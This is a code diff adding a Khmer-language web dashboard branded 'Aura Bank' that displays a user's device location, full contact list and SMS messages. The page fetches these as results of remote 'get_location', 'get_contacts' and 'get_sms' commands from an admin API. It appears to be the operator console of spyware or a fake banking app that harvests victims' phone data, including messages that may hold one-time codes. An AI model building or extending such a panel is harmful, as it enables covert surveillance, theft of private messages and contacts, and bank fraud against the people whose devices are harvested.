@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="km">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Aura Bank · គ្រប់គ្រងឧបករណ៍</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Khmer:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="styles.css">
+<style>
+  body { margin: 0; padding: 20px; background: #f5f5f5; }
+  .manager-container { max-width: 1400px; margin: 0 auto; }
+  .manager-header { background: white; padding: 20px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+  .manager-header h1 { margin: 0 0 8px; font-size: 24px; }
+  .manager-header .meta { color: #666; font-size: 14px; }
+  .tab-bar { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
+  .tab-btn { padding: 10px 20px; border: 2px solid var(--line); background: white; border-radius: 8px; cursor: pointer; font-weight: 600; transition: all 0.2s; }
+  .tab-btn:hover { border-color: #3B9AD9; background: #f0f9ff; }
+  .tab-btn.active { border-color: #3B9AD9; background: #3B9AD9; color: white; }
+  .tab-content { display: none; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+  .tab-content.active { display: block; }
+  .data-table { width: 100%; border-collapse: collapse; margin-top: 16px; }
+  .data-table th { background: #f9fafb; padding: 12px; text-align: left; border-bottom: 2px solid var(--line); position: sticky; top: 0; }
+  .data-table td { padding: 12px; border-bottom: 1px solid #e5e7eb; }
+  .data-table tr:hover { background: #f9fafb; }
+  .sms-card { padding: 16px; border: 1px solid #e5e7eb; border-radius: 8px; margin-bottom: 12px; background: white; }
+  .sms-card:hover { box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+  .sms-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
+  .sms-meta { font-size: 12px; color: #666; margin-bottom: 8px; }
+  .sms-body { white-space: pre-wrap; margin: 8px 0 0; }
+  .pill { padding: 2px 8px; border-radius: 4px; font-size: 12px; }
+  .pill.inbox { background: #dbeafe; color: #1e40af; }
+  .pill.sent { background: #dcfce7; color: #166534; }
+  .pill.read { background: #f3f4f6; color: #666; }
+  .pill.unread { background: #fef3c7; color: #92400e; }
+  .empty { text-align: center; padding: 40px; color: #999; }
+  .search-box { width: 100%; padding: 10px; border: 1px solid var(--line); border-radius: 8px; margin-bottom: 16px; font-size: 14px; }
+  .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 20px; }
+  .stat-card { padding: 16px; background: #f9fafb; border-radius: 8px; text-align: center; }
+  .stat-value { font-size: 24px; font-weight: 700; color: #3B9AD9; }
+  .stat-label { font-size: 12px; color: #666; margin-top: 4px; }
+</style>
+</head>
+<body>
+
+<div class="manager-container">
+  <div class="manager-header">
+    <h1 id="pageTitle">📱 គ្រប់គ្រងឧបករណ៍</h1>
+    <div class="meta" id="pageMeta">កំពុងផ្ទុក...</div>
+  </div>
+
+  <div class="tab-bar">
+    <button class="tab-btn active" data-tab="location">📍 ទីតាំង</button>
+    <button class="tab-btn" data-tab="contacts">👥 Contacts</button>
+    <button class="tab-btn" data-tab="sms">💬 SMS</button>
+  </div>
+
+  <div id="location-tab" class="tab-content active">
+    <div class="stats" id="locationStats"></div>
+    <div id="locationContent"></div>
+  </div>
+
+  <div id="contacts-tab" class="tab-content">
+    <input type="search" class="search-box" id="contactSearch" placeholder="ស្វែងរក contact...">
+    <div class="stats" id="contactStats"></div>
+    <div id="contactsContent"></div>
+  </div>
+
+  <div id="sms-tab" class="tab-content">
+    <input type="search" class="search-box" id="smsSearch" placeholder="ស្វែងរក SMS...">
+    <div class="stats" id="smsStats"></div>
+    <div id="smsContent"></div>
+  </div>
+</div>
+
+<script>
+const API = '/admin/api';
+let token = localStorage.getItem('admin_token');
+let userId = null;
+let commandData = {};
+
+// Get user ID from URL params
+const params = new URLSearchParams(window.location.search);
+userId = params.get('user_id');
+
+if (!userId) {
+  alert('❌ មិនមាន user ID');
+  window.close();
+}
+
+async function api(path, opts = {}) {
+  const res = await fetch(API + path, {
+    ...opts,
+    headers: {
+      ...(opts.body ? { 'Content-Type': 'application/json' } : {}),
+      ...(token ? { Authorization: 'Bearer ' + token } : {}),
+    },
+    body: opts.body ? JSON.stringify(opts.body) : undefined,
+  });
+  let json = null;
+  try { json = await res.json(); } catch (_) {}
+  if (!res.ok) {
+    if (res.status === 401 && token) { 
+      alert('Session expired');
+      window.close();
+    }
+    throw new Error(json?.error || `HTTP ${res.status}`);
+  }
+  return json?.data;
+}
+
+function esc(s) {
+  if (s == null) return '';
+  return String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+}
+
+function dt(d) {
+  if (!d) return '—';
+  return new Date(d).toLocaleString('km-KH');
+}
+
+// Tab switching
+document.querySelectorAll('.tab-btn').forEach(btn => {
+  btn.onclick = () => {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById(btn.dataset.tab + '-tab').classList.add('active');
+  };
+});
+
+// Load data
+async function loadData() {
+  try {
+    const commands = await api(`/device/commands?user_id=${userId}&limit=200`);
+    
+    // Find latest commands for each type
+    const locationCmd = commands.find(c => c.command_type === 'get_location' && c.result_data);
+    const contactsCmd = commands.find(c => c.command_type === 'get_contacts' && c.result_data);
+    const smsCmd = commands.find(c => c.command_type === 'get_sms' && c.result_data);
+    
+    commandData = {
+      location: locationCmd?.result_data,
+      contacts: contactsCmd?.result_data,
+      sms: smsCmd?.result_data,
+    };
+    
+    // Update header
+    document.getElementById('pageMeta').textContent = `User ID: ${userId} | ទិន្នន័យថ្មីបំផុត`;
+    
+    // Render all tabs
+    renderLocation();
+    renderContacts();
+    renderSMS();
+    
+  } catch (error) {
+    console.error('Load error:', error);
+    alert('❌ មិនអាចផ្ទុកទិន្នន័យ: ' + error.message);
+  }
+}
+
+function renderLocation() {
+  const data = commandData.location;
+  if (!data) {
+    document.getElementById('locationStats').innerHTML = '';
+    document.getElementById('locationContent').innerHTML = '<div class="empty">មិនមានទិន្នន័យទីតាំង</div>';
+    return;
+  }
+  
+  document.getElementById('locationStats').innerHTML = `
+    <div class="stat-card">
+      <div class="stat-value">${data.lat?.toFixed(6) || '—'}</div>
+      <div class="stat-label">Latitude</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value">${data.lng?.toFixed(6) || '—'}</div>
+      <div class="stat-label">Longitude</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value">${data.accuracy || '—'}m</div>
+      <div class="stat-label">Accuracy</div>
+    </div>
+  `;
+  
+  document.getElementById('locationContent').innerHTML = `
+    <table class="data-table">
+      <tr><th>ភូមិ</th><td>${esc(data.village || '—')}</td></tr>
+      <tr><th>ឃុំ/សង្កាត់</th><td>${esc(data.commune || '—')}</td></tr>
+      <tr><th>ស្រុក/ខណ្ឌ</th><td>${esc(data.district || '—')}</td></tr>
+      <tr><th>ខេត្ត/ក្រុង</th><td>${esc(data.province || '—')}</td></tr>
+      <tr><th>ប្រទេស</th><td>${esc(data.country || '—')}</td></tr>
+    </table>
+  `;
+}
+
+function renderContacts(filter = '') {
+  const data = commandData.contacts;
+  if (!data || !data.contacts) {
+    document.getElementById('contactStats').innerHTML = '';
+    document.getElementById('contactsContent').innerHTML = '<div class="empty">មិនមាន contacts ទេ។ សូមចុច 👥 Contacts ក្នុង admin panel ដើម្បីទាញយកទិន្នន័យ។</div>';
+    return;
+  }
+  
+  let contacts = data.contacts;
+  if (filter) {
+    const f = filter.toLowerCase();
+    contacts = contacts.filter(c => 
+      (c.displayName || '').toLowerCase().includes(f) ||
+      (c.phones || []).some(p => p.includes(f)) ||
+      (c.emails || []).some(e => e.toLowerCase().includes(f))
+    );
+  }
+  
+  document.getElementById('contactStats').innerHTML = `
+    <div class="stat-card">
+      <div class="stat-value">${contacts.length}</div>
+      <div class="stat-label">Contacts ទាំងអស់</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value">${contacts.filter(c => c.phones && c.phones.length > 0).length}</div>
+      <div class="stat-label">មានលេខទូរស័ព្ទ</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value">${contacts.filter(c => c.emails && c.emails.length > 0).length}</div>
+      <div class="stat-label">មាន Email</div>
+    </div>
+  `;
+  
+  if (contacts.length === 0) {
+    document.getElementById('contactsContent').innerHTML = '<div class="empty">រកមិនឃើញ contact ដែលត្រូវនឹងការស្វែងរក</div>';
+    return;
+  }
+  
+  document.getElementById('contactsContent').innerHTML = `
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>ឈ្មោះ</th>
+          <th>ទូរស័ព្ទ</th>
+          <th>Email</th>
+        </tr>
+      </thead>
+      <tbody>
+        ${contacts.map(c => `
+          <tr>
+            <td>${esc(c.displayName || '—')}</td>
+            <td style="font-family:monospace">${esc((c.phones || []).join(', ') || '—')}</td>
+            <td>${esc((c.emails || []).join(', ') || '—')}</td>
+          </tr>
+        `).join('')}
+      </tbody>
+    </table>
+  `;
+}
+
+function renderSMS(filter = '') {
+  const data = commandData.sms;
+  if (!data || !data.messages) {
+    document.getElementById('smsStats').innerHTML = '';
+    document.getElementById('smsContent').innerHTML = '<div class="empty">មិនមាន SMS ទេ។ សូមចុច 📨 Read SMS ក្នុង admin panel ដើម្បីទាញយកទិន្នន័យ។</div>';
+    return;
+  }
+  
+  let messages = data.messages;
+  if (filter) {
+    const f = filter.toLowerCase();
+    messages = messages.filter(m => 
+      (m.address || '').toLowerCase().includes(f) ||
+      (m.body || '').toLowerCase().includes(f)
+    );
+  }
+  
+  document.getElementById('smsStats').innerHTML = `
+    <div class="stat-card">
+      <div class="stat-value">${messages.length}</div>
+      <div class="stat-label">SMS ទាំងអស់</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value">${messages.filter(m => m.type === 'inbox').length}</div>
+      <div class="stat-label">Inbox</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value">${messages.filter(m => m.type === 'sent').length}</div>
+      <div class="stat-label">Sent</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value">${messages.filter(m => !m.read).length}</div>
+      <div class="stat-label">មិនទាន់អាន</div>
+    </div>
+  `;
+  
+  if (messages.length === 0) {
+    document.getElementById('smsContent').innerHTML = '<div class="empty">រកមិនឃើញ SMS ដែលត្រូវនឹងការស្វែងរក</div>';
+    return;
+  }
+  
+  document.getElementById('smsContent').innerHTML = messages.map(m => `
+    <div class="sms-card">
+      <div class="sms-header">
+        <strong>${esc(m.address || 'Unknown')}</strong>
+        <small>${dt(m.date)}</small>
+      </div>
+      <div class="sms-meta">
+        <span class="pill ${m.type || 'unknown'}">${esc(m.type || 'unknown')}</span>
+        ${m.read ? '<span class="pill read">✓ អាន</span>' : '<span class="pill unread">● ថ្មី</span>'}
+      </div>
+      <p class="sms-body">${esc(m.body || '')}</p>
+    </div>
+  `).join('');
+}
+
+// Search handlers
+document.getElementById('contactSearch').oninput = (e) => renderContacts(e.target.value);
+document.getElementById('smsSearch').oninput = (e) => renderSMS(e.target.value);
+
+// Load data on page load
+loadData();
+</script>
+
+</body>
+</html>
